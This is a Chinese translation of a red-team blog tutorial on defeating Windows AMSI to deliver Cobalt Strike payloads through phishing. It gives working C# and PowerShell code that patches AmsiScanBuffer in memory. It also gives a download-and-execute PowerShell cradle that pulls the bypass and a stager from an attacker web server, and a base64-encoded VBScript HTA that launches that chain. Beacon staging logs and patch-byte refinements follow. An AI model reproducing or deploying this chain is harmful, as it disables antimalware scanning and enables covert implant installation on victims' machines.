> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/4377)

前言
--

> ps: 我觉得可以学习其中的思路，直接 kill 掉进程，找到 AV 的特征。

前面的部分我介绍了`AmsiScanBuffer Bypass`的思路，主要是修改了代码，避免被检测到。  
在这篇文章中，我会介绍一种新的方法，结合`Cobalt Strike / Empire /`使用

Begin
-----

我们有一下几个目标：

*   通过网络钓鱼或者社工将恶意文件给到目标手里
*   最好是什么呢？初始的 payload 尽量小，体积不要太大
*   `Bypass AMSI`
*   payload 执行成功的话，拿到`Beacon`

对于攻击方法，我们使用可以执行`powershell`代码的 HTA 文件，这个文件负责执行`Bypass AMSI`部分的代码。

生成 Stager
---------

我们首先生成一个简单的`stager`，放在在 Web 服务器上，然后`AMSI`确实阻止了我们的 payload 运行。下载之后就会执行 payload，所以得保证行为要符合我们的预期。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309000516.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309000516.png)

AMSI Bypass
-----------

对于`AMSI Bypass`的`payload`，我们将把`C#源代码`放到`PowerShell`脚本中，并使用`Add-Type`，在`PowerShell`会话中可以使用。

```
$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
)

$Source = @"
using System;
using System.Runtime.InteropServices;
namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }
            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
            if (ASBPtr == IntPtr.Zero) { return 1; }
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
```

下载然后执行，看效果。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309001938.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309001938.png)

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309001948.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309001948.png)

可以看一下伪代码：

```
execute bypass; if (bypass -eq "0") { execute stager }
```

bypass 返回 1 的话，就 GG 了。

HTA
---

要在 HTA 中执行 PowerShell，我们可以对其进行 base64 编码，这样我们就不必担心转义字符啦。

```
$string = 'iex ((new-object net.webclient).downloadstring("http://192.168.214.129/amsi-bypass")); if([Bypass.AMSI]::Disable() -eq "0") { iex ((new-object net.webclient).downloadstring("http://192.168.214.129/stager")) }'
```

```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))
```

最终的 HTA 很小。

```
<script language="VBScript">
    Function var_func()
        Dim var_shell
        Set var_shell = CreateObject("Wscript.Shell")
        var_shell.run "powershell.exe -nop -w 1 -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADQALgAxADIAOQAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADQALgAxADIAOQAvAHMAdABhAGcAZQByACIAKQApACAAfQA=", 0, true
    End Function

    var_func
    self.close
</script>
```

测试，`C:\Users\Rasta>mshta http://192.168.214.129/delivery.hta。`

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309003407.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309003407.png)

网络日志：

```
10/31 11:22:44 visit from: 192.168.214.1
    Request: GET /amsi-bypass
    page Serves /opt/cobaltstrike/uploads/AMSIBypass.ps1
    null

10/31 11:22:44 visit from: 192.168.214.1
    Request: GET /stager
    page Serves /opt/cobaltstrike/uploads/stager.ps1
    null

10/31 11:22:44 visit from: 192.168.214.1
    Request: GET /__init.gif
    beacon beacon stager x64
    Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
```

代码我传到了 [Github](https://github.com/rasta-mouse/AmsiScanBufferBypass)

续
-

你如果读了前面的部分，就知道我都是在内存中 pathing`AMSI DLL`，但是我在修改代码之前，探索一下其他的问题，这样有助于更好的理解。

Bypass Primer
-------------

我们可以使用 API​​ Monitor 正在发生的事件。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309004242.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309004242.png)

总结一下我观察到的：

*   powershell.exe 启动然后`amsi.dll`加载到内存空间。
*   我们在控制台中输入测试内容。
*   AmsiScanBuffer 函数被调用。
*   我们的输入被传递到第四处。

微软文档上的`AmsiScanBuffer`函数

```
HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result
);
```

有一个 buf 的 length，有一个 result 返回。为了可视化 bypass 过程，`hook powershell`

我会在`AmsiScanBuffer`函数上设置断点并在控制台中输入内容。

跟进到`mov edi, r8d`， CyberArk 的文章中提到过，r8d 包含 buf length

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309140223.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309140223.png)

二进制值

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309140256.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309140256.png)

edi 和 r8d 含有 2c - 十进制的 44

我们的字符串 "this is some garbage" 是 22 个字符

改一下指令  
更改`mov edi, r8d为xor edi, edi`  
因为如果你 xor 两个相同的值，结果就是 0.

然后运行脚本试试。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309141225.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309141225.png)

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309141236.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309141236.png)

AmsiScanBuffer 为 0 的话，就不会报毒。

AMSI_RESULT_CLEAN
-----------------

我和 Kuba Gretzky 讨论的时候，他说

> Bypass 的风险部分是它使用了从函数一开始的固定偏移量`AmsiScanBufferPtr + 0x001b`。如果 MS 稍微修改 AmsiScanBuffer 功能，Bypass 将导致崩溃。在函数的开头进行 patch，直接返回空更合适一些。

我们看一下 AMSI_RESULT 之前被忽略的细节 - 因为可以返回不同的结果。

```
typedef enum AMSI_RESULT {
  AMSI_RESULT_CLEAN,
  AMSI_RESULT_NOT_DETECTED,
  AMSI_RESULT_BLOCKED_BY_ADMIN_START,
  AMSI_RESULT_BLOCKED_BY_ADMIN_END,
  AMSI_RESULT_DETECTED
} ;
```

我们试着去 patch 它。  
重新看一下`Binary Ninja`中的`AmsiScanBuffer`函数，我们可以看到有一大堆指令后面是跟着条件跳转，但都是相同的地址：0x180024f5。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309142720.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309142720.png)

我们猜测的指令 AMSI_RESULT_CLEAN 其中的内容是`mov eax, 0x80070057`  
[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309142824.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309142824.png)

最初的 patch 是

```
Byte[] Patch = { 0x31, 0xff, 0x90 };
IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
Marshal.Copy(Patch, 0, unmanagedPointer, 3);
MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
```

修改为

```
Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
Marshal.Copy(Patch, 0, unmanagedPointer, 6);
MoveMemory(ASBPtr, unmanagedPointer, 6);
```

`0xB8, 0x57, 0x00, 0x07, 0x80`（十六进制）操作码在`mov eax, 0x80070057;`而且`0xC3`是一个 retn。并注意没有偏移 - 我在修补函数中的前两个指令。  
在我们执行这个补丁之前，我们可以在`AmsiScanBuffer`指针处验证前两个指令。  
[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309143748.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309143748.png)  
加上补丁之后，再执行一遍......

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309143912.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309143912.png)

其余的指令变得有点含糊不清，但这并不重要。我们只是希望进入`AmsiScanBuffer`，设置`eax`和`return`。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309144001.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309144001.png)  
完美！

续
-

有人私信我问了我两个问题，和他们交流过程中我也很自豪。

无法成功运行
------

第一个问题看起来像这样：

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309144542.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309144542.png)

看起来不知所以然，因为 AMSI 看起来已经被禁用了，但是为什么 stage 还是无法执行。  
通过启动`Process Explorer`，我们可以看到我们的控制台所处的 PowerShell 进程（高灰色）。然后，当运行 IEX 时，会很快的在被杀死之前创建一个新的子 PowerShell 进程（以绿色突出显示）。

因为这个 AMSI Bypass 是按顺序进行的，所以这个新进程的 amsi.dll 完好无损，GG。它不会继承父进程，这显然是检测的原因。

接下来的问题是，为什么 child 会产生？  
通过检查`Process Explorer`中的两个进程，我们看到子进程的路径是`c:\Windows\SysWOW64\windowspowershell\v1.0\powershell.exe`  
父进程的路径`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`。  
所以这是产生 32 位版本的 64 位的二进制文​​件。

最好的解释就是，我们是在 64 位进程中运行的 32 位 stager。所以，这是你 payload 的问题。例如，`Cobalt Strike Scripted Web Delivery`默认创建一个 32 位 stager（您甚至无法选择将其设置为 64 位）。因此，您必须确保无论使用哪个工具，都要可以创建 64 位有效负载。

crash
-----

我发现这个更有趣。

第二个问题是由于内存损坏，PowerShell 进程在 Bypass 时崩溃掉。只有在 32 位进程中运行时才会发生这种情况。

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309145346.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309145346.png)

你可能使用了未修改前的代码。

```
Byte[] Patch = { 0x31, 0xff, 0x90 };
IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
Marshal.Copy(Patch, 0, unmanagedPointer, 3);
MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
```

但是修改后兼容性更好一些

```
Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
Marshal.Copy(Patch, 0, unmanagedPointer, 6);
MoveMemory(ASBPtr, unmanagedPointer, 6);
```

32 位进程中运行很正常

[![](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309145546.png)](https://raw.githubusercontent.com/evilwing/wing-images/master/20190309145546.png)

我希望通过我这几篇文章，能让你有更多的思路。

[原文链接](https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/)